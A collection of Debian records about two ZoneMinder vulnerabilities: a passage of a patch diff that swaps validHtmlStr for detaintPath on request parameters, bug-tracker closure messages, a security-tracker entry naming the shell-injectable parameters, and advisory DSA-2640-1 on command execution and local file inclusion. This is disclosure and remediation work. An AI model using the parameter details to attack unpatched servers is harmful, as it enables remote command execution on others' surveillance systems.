+-    $view = validHtmlStr($_REQUEST['view']);
++    $view = detaintPath($_REQUEST['view']);
++
++if ( isset($_REQUEST['request']) )
++    $request = detaintPath($_REQUEST['request']);
+
+ if ( isset($_REQUEST['action']) )
+-    $action = validHtmlStr($_REQUEST['action']);
++    $action = detaintPath($_REQUEST['action']);
+
+ require_once( 'includes/actions.php' );
+
+@@ -108,7 +111,6 @@
+
+ if ( isset( $_REQUEST['request'] ) )
+ {
+-    $request = validHtmlStr($_REQUEST['request']);
+     foreach ( getSkinIncludes( 'ajax/'.$request.'.php', true, true ) as $includeFile )
+     {
+         if ( !file_exists( $includeFile ) )
diff -Nru zoneminder-1.24.2/debian/patches/series zoneminder-1.24.2/debian/patches/series
--- zoneminder-1.24.2/debian/patches/series     2011-01-14 12:01:53.000000000 -0800
+++ zoneminder-1.24.2/debian/patches/series     2013-02-26 16:56:45.000000000 -0800
@@ -7,3 +7,5 @@
 suppported-typo
 use_libjs-mootools
 fix_v4l2_cameras_without_crop
+cve-2013-0232
+cve-2013-0332

live well,
  vagrant

```

---

**Reply sent**
to `Vagrant Cascadian <vagrant@debian.org>`:

You have taken responsibility.
(Sun, 17 Mar 2013 00:51:12 GMT) ([full text](bugreport.cgi?bug=698910;msg=77), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=77), [link](#76)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Sun, 17 Mar 2013 00:51:12 GMT) ([full text](bugreport.cgi?bug=698910;msg=79), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=79), [link](#78)).

---

[Message #80](#80) received at 698910-close@bugs.debian.org ([full text](bugreport.cgi?bug=698910;msg=80), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=80), reply):

![](/cgi-bin/libravatar.cgi?email=vagrant%40debian.org)
From: Vagrant Cascadian <vagrant@debian.org>
To: 698910-close@bugs.debian.org
Subject: Bug#698910: fixed in zoneminder 1.24.2-8+squeeze1
Date: Sun, 17 Mar 2013 00:47:39 +0000
```
Source: zoneminder
Source-Version: 1.24.2-8+squeeze1

We believe that the bug you reported is fixed in the latest version of
zoneminder, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 698910@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Vagrant Cascadian <vagrant@debian.org> (supplier of updated zoneminder package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Tue, 05 Mar 2013 11:29:20 -0800
Source: zoneminder
Binary: zoneminder
Architecture: source i386
Version: 1.24.2-8+squeeze1
Distribution: stable-security
Urgency: high
Maintainer: Peter Howard <pjh@northern-ridge.com.au>
Changed-By: Vagrant Cascadian <vagrant@debian.org>
Description:
 zoneminder - Linux video camera security and surveillance solution
Closes: [698910](bugreport.cgi?bug=698910) [700912](bugreport.cgi?bug=700912)
Changes:
 zoneminder (1.24.2-8+squeeze1) stable-security; urgency=high
 .
   * Add [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232) patch
     [SECURITY] [CVE-2013-0232](https://security-tracker.debian.org/tracker/CVE-2013-0232): Shell escape commands with untrusted content.
     Thanks to James McCoy <jamessan@debian.org> (Closes: #[698910](bugreport.cgi?bug=698910))
     Thanks also to Salvatore Bonaccorso <carnil@debian.org>
   * Add [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332) patch
     [SECURITY] [CVE-2013-0332](https://security-tracker.debian.org/tracker/CVE-2013-0332): local file inclusion (Closes: #[700912](bugreport.cgi?bug=700912)).
     Thanks to Salvatore Bonaccorso <carnil@debian.org> for the patch.
Checksums-Sha1:
 ae8f0f4b6efe78716884bc1e7c90d7540e953160 2163 zoneminder_1.24.2-8+squeeze1.dsc
 ea854c941b83374a352d7d794a4462e279fea487 965521 zoneminder_1.24.2.orig.tar.gz
 e48447bcbc7dff2fc0298df6bc945c228a2a3f02 16354 zoneminder_1.24.2-8+squeeze1.debian.tar.gz
 52df39684bdf4a824093307f08e4feb0f6089634 1452144 zoneminder_1.24.2-8+squeeze1_i386.deb
Checksums-Sha256:
 fcf53e1f74a319e01b5ebc27bac5fbd6206361a1009bb71b838408375bd6a30a 2163 zoneminder_1.24.2-8+squeeze1.dsc
 fd8475138ccee8870534f1210a3d1e3e1990e963dd73146a6d310dc71c463dca 965521 zoneminder_1.24.2.orig.tar.gz
 49dc4eca5d00d895a66d69429624dbf1c6bcd292a24869ea198a1ac49a07113b 16354 zoneminder_1.24.2-8+squeeze1.debian.tar.gz
 076ea52707b213172ddde42420d27dc0de7d5c0d865651700d50d48af589a1f8 1452144 zoneminder_1.24.2-8+squeeze1_i386.deb
Files:
 5948f712a603d4ea59dff82b3c0cd13d 2163 net optional zoneminder_1.24.2-8+squeeze1.dsc
 550d2f8f08852134028c3b1cf8fa437f 965521 net optional zoneminder_1.24.2.orig.tar.gz
 65fc0a8d14f672dd3c6cf8586abdf086 16354 net optional zoneminder_1.24.2-8+squeeze1.debian.tar.gz
 df954eec140564bac3f36dcb5c8e4fc9 1452144 net optional zoneminder_1.24.2-8+squeeze1_i386.deb

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)

iQIcBAEBCgAGBQJRNlGIAAoJELeLgtSBS5G2j2UP/20Y4yz7on6jQvEZhh6AS7I0
rzGODYx9YZj/EJcUwlXR9g8dmrRnbFi8tpOOA+0EXUVqeJwOj3wq+ch+7aPYuzgK
/WKT3tp+H/qxcqXcKHD1+vDvDKds2qjRIBQHLev4pWqaqY+s8ocvne63oRqRKb9q
u3zdo3wn7nJoiPbQKvCB0SlQWxV5fGyOJ0YQ0CYOF2qjYViUEge0XUhCWi9IhudL
ukuQR+KSuAS4N2i8Z/+32edCBdOgBL9uYCsMJ5LUSi4A0m8g08O5Jghg6foClLAh
ur3JDAfmamBEHMvTw1+qfw1Ek3xwUjqjKXjlGpxOilvgCfOAVml3KY3JZ3rTE+5g
xA570W2oDEuFO7ZHxxzg5EMCI5gGlyJWDhs6u1gJbk8bbBz7bKCyvqduC+tK5www
XglushHPUGtOPuhFcbG5nHYklJL01S0nIPoFEXxAzjiPBp+URql7+EYMJGVfibHc
wTKFs1ks7TjjDrmQkyc0XJrZWvg3QQgGy5E2cxt8amBfuBEzR9pHTTzK95iO18cc
mKNE1vqc5q/cyjp+5IlIl9Pmjyg1UDrgz1exICbJTIZq/3XrNZCzlGHM367eOXeY
lVEOx7oJkwMZ5L0zQVwgn0bj8ui9A5w6FHiy9t6YEufhi+5BVAqSPJqQ4032tMv4
njXHyQV4scz8PdHjrcTF
=ZGx8
-----END PGP SIGNATURE-----

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 02 Jun 2013 07:34:44 GMT) ([full text](bugreport.cgi?bug=698910;msg=82), [mbox](bugreport.cgi?bug=698910;mbox=yes;msg=82), [link](#81)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=698910).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Fri Jan 24 21:23:45 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from security-tracker.debian.org_486e6881_20250126_033703.html ===

# CVE-2013-0232

| **Name** | CVE-2013-0232 |
| --- | --- |
| **Description** | includes/functions.php in ZoneMinder Video Server 1.24.0, 1.25.0, and earlier allows remote attackers to execute arbitrary commands via shell metacharacters in the (1) runState parameter in the packageControl function; or (2) key or (3) command parameter in the setDeviceStatusX10 function. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2013-0232) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2013-0232); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2013-0232), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2013-0232), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2013-0232), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2013-0232), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2013-0232), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2013-0232), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2013-0232), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2013-0232)/[CVE](https://www.suse.com/security/cve/CVE-2013-0232/), GitHub [advisories](https://github.com/advisories?query=CVE-2013-0232)/[code](https://github.com/search?type=Code&q=%22CVE-2013-0232%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2013-0232%22), [web search](https://duckduckgo.com/html?q=%22CVE-2013-0232%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **References** | [DSA-2640-1](/tracker/DSA-2640-1) |
| **Debian Bugs** | [698910](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=698910) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [zoneminder](/tracker/source-package/zoneminder) ([PTS](https://tracker.debian.org/pkg/zoneminder)) | bullseye | 1.34.23-1 | fixed |
|  | sid, bookworm | 1.36.33+dfsg1-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [zoneminder](/tracker/source-package/zoneminder) | source | squeeze | 1.24.2-8+squeeze1 |  | [DSA-2640-1](/tracker/DSA-2640-1) |  |
| [zoneminder](/tracker/source-package/zoneminder) | source | (unstable) | 1.25.0-4 |  |  | [698910](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=698910) |

## Notes

```
<https://bugzilla.redhat.com/show_bug.cgi?id=904103>
Upstream forum post: <http://www.zoneminder.com/forums/viewtopic.php?f=29&t=20771>

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from www.debian.org_af1d781c_20250124_212348.html ===


---

[[Date Prev](msg00049.html)][[Date Next](msg00051.html)]
[[Thread Prev](msg00049.html)][[Thread Next](msg00051.html)]
[[Date Index](maillist.html#00050)]
[[Thread Index](threads.html#00050)]

# [SECURITY] [DSA 2640-1] zoneminder security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 2640-1] zoneminder security update
* *From*: Salvatore Bonaccorso <carnil@debian.org>
* *Date*: Thu, 14 Mar 2013 19:04:52 +0100
* *Message-id*: <[[🔎]](/msgid-search/20130314180452.GA5273%40pisco.westfalen.local) [20130314180452.GA5273@pisco.westfalen.local](msg00050.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

- -------------------------------------------------------------------------
Debian Security Advisory DSA-2640-1                   security@debian.org
<http://www.debian.org/security/>                      Salvatore Bonaccorso
March 14, 2013                         <http://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : zoneminder
Vulnerability  : several issues
Problem type   : remote
Debian-specific: no
CVE ID         : CVE-2013-0232 CVE-2013-0332
Debian Bug     : 698910 700912

Multiple vulnerabilities were discovered in zoneminder, a Linux video
camera security and surveillance solution. The Common Vulnerabilities
and Exposures project identifies the following problems:

CVE-2013-0232

    Brendan Coles discovered that zoneminder is prone to an arbitrary
    command execution vulnerability. Remote (authenticated) attackers
    could execute arbitrary commands as the web server user.

CVE-2013-0332

    zoneminder is prone to a local file inclusion vulnerability. Remote
    attackers could examine files on the system running zoneminder.

For the stable distribution (squeeze), these problems have been fixed in
version 1.24.2-8+squeeze1.

For the testing distribution (wheezy), these problems have been fixed in
version 1.25.0-4.

For the unstable distribution (sid), these problems have been fixed in
version 1.25.0-4.

We recommend that you upgrade your zoneminder packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <http://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.12 (GNU/Linux)

iEYEARECAAYFAlFCERAACgkQXm3vHE4uylqVCQCg0iXjoGGmBmhknkn2UMsTh+iF
crcAnjC/D4FwozZkfPHdilBd+wen14t9
=638X
-----END PGP SIGNATURE-----

```

---


